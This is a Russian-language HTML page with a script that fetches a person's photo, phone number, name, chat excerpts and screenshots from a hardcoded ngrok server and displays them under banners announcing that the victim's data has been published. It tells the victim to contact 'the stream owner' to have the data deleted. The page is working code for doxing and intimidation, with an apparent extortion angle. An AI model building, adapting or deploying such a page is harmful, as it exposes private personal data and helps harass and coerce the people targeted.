<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Система активирована</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 550px;
            width: 100%;
            background: linear-gradient(145deg, #111, #1a0a0a);
            border: 2px solid #ff3355;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 0 80px rgba(255, 51, 85, 0.15);
            text-align: center;
        }
        .header {
            color: #ff3355;
            font-size: 24px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 10px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .subheader {
            color: #ff6680;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .user-photo {
            width: 250px;
            height: 250px;
            border-radius: 50%;
            border: 4px solid #ff3355;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            color: #444;
            background: #1a1a1a;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(255, 51, 85, 0.3);
            transition: transform 0.3s ease;
        }
        .user-photo:hover {
            transform: scale(1.05);
        }
        .user-photo img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }
        .info-block {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(255,51,85,0.2);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            text-align: left;
        }
        .info-block .label {
            color: #ff6680;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: bold;
        }
        .info-block .value {
            color: #00ffcc;
            font-size: 15px;
            margin-top: 8px;
            word-break: break-word;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
            line-height: 1.6;
        }
        .info-block .value .highlight {
            color: #ff6680;
            font-weight: bold;
        }
        .screenshots {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 15px 0;
        }
        .screenshots img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.1);
            background: #1a1a1a;
            min-height: 80px;
            object-fit: cover;
        }
        .screenshots .empty {
            background: #1a1a1a;
            height: 100px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #444;
            font-size: 12px;
            border: 1px dashed #333;
        }
        .status {
            color: #ff3355;
            font-size: 16px;
            animation: blink 1s infinite;
            margin: 20px 0;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .footer {
            color: #555;
            font-size: 10px;
            margin-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.05);
            padding-top: 15px;
        }
        .warning {
            color: #ff3355;
            font-size: 13px;
            margin-top: 10px;
            padding: 12px;
            border: 1px solid rgba(255,51,85,0.2);
            border-radius: 8px;
            background: rgba(255,51,85,0.05);
        }
        .size-info {
            color: #666;
            font-size: 11px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">🔴 СИСТЕМА АКТИВИРОВАНА</div>
        <div class="subheader">Ваши данные находятся в открытом доступе</div>

        <div class="user-photo" id="userPhoto"><span>📸</span></div>

        <div class="info-block">
            <div class="label">📱 Телефон</div>
            <div class="value" id="userPhone">Загрузка...</div>
        </div>

        <div class="info-block">
            <div class="label">👤 Имя</div>
            <div class="value" id="userName">Загрузка...</div>
        </div>

        <div class="info-block">
            <div class="label">💬 Данные из переписки</div>
            <div class="value" id="userData">Загрузка...</div>
        </div>

        <div class="info-block">
            <div class="label">📸 Скриншоты переписки</div>
            <div class="screenshots" id="screenshots">
                <div class="empty">Нет данных</div>
                <div class="empty">Нет данных</div>
            </div>
        </div>

        <div class="status">⚠️ ДАННЫЕ ОПУБЛИКОВАНЫ</div>

        <div class="warning">⚡ Для удаления данных обратитесь к владельцу стрима</div>

        <div class="footer">
            Система активирована • Время публикации: <span id="time"></span>
            <div class="size-info" id="sizeInfo"></div>
        </div>
    </div>

    <script>
        // ============================================================
        // ПОЛУЧАЕМ ID ИЗ URL (например /abc123)
        // ============================================================
        const path = window.location.pathname;
        const shortId = path.substring(1);
        
        // ===== НОВЫЙ NGROK АДРЕС! =====
        const NGROK_URL = 'https://2d2b-178-88-32-33.ngrok-free.app';
        
        console.log('🔍 ID из URL:', shortId);
        
        if (shortId) {
            // ============================================================
            // 1. ЗАГРУЖАЕМ ФОТО С СЕРВЕРА
            // ============================================================
            const photoUrl = `${NGROK_URL}/photo/${shortId}`;
            console.log('📸 Запрос фото:', photoUrl);
            
            // ДОБАВЛЯЕМ ЗАГОЛОВОК ДЛЯ NGROK!
            const headers = new Headers();
            headers.append('ngrok-skip-browser-warning', 'true');
            
            fetch(photoUrl, { headers })
                .then(response => {
                    console.log('📸 Статус ответа фото:', response.status);
                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                    return response.blob();
                })
                .then(blob => {
                    console.log('📸 Фото получено, размер:', blob.size, 'байт');
                    const img = document.createElement('img');
                    img.src = URL.createObjectURL(blob);
                    img.alt = 'Фото пользователя';
                    img.onerror = function() {
                        this.parentElement.innerHTML = '<span>❌ Ошибка загрузки фото</span>';
                    };
                    document.getElementById('userPhoto').innerHTML = '';
                    document.getElementById('userPhoto').appendChild(img);
                })
                .catch(error => {
                    console.error('❌ Ошибка загрузки фото:', error);
                    document.getElementById('userPhoto').innerHTML = '<span>❌ Фото не найдено</span>';
                });
            
            // ============================================================
            // 2. ЗАГРУЖАЕМ ДАННЫЕ (ТЕЛЕФОН, ИМЯ, ТЕКСТ)
            // ============================================================
            const dataUrl = `${NGROK_URL}/${shortId}`;
            console.log('📡 Запрос данных:', dataUrl);
            
            fetch(dataUrl, { headers })
                .then(response => {
                    console.log('📡 Статус ответа данных:', response.status);
                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
                    return response.json();
                })
                .then(data => {
                    console.log('📦 Данные получены:', data);
                    
                    if (data.success) {
                        if (data.phone) document.getElementById('userPhone').textContent = data.phone;
                        if (data.name) document.getElementById('userName').textContent = data.name;
                        if (data.data) document.getElementById('userData').textContent = data.data;
                        
                        if (data.screenshots && data.screenshots.length > 0) {
                            const container = document.getElementById('screenshots');
                            container.innerHTML = '';
                            data.screenshots.forEach(src => {
                                const img = document.createElement('img');
                                img.src = 'data:image/jpeg;base64,' + src;
                                img.onerror = function() {
                                    this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
                                };
                                container.appendChild(img);
                            });
                        }
                    } else {
                        document.getElementById('userData').textContent = '❌ Данные не найдены';
                    }
                })
                .catch(error => {
                    console.error('❌ Ошибка загрузки данных:', error);
                    document.getElementById('userData').textContent = '❌ Ошибка загрузки: ' + error.message;
                    document.getElementById('userPhone').textContent = '❌ Ошибка';
                    document.getElementById('userName').textContent = '❌ Ошибка';
                });
        } else {
            document.getElementById('userData').textContent = '❌ Нет ID для загрузки';
            console.log('❌ shortId не найден в URL');
        }
        
        // ===== ВРЕМЯ =====
        document.getElementById('time').textContent = new Date().toLocaleString('ru-RU');
    </script>
</body>
</html>
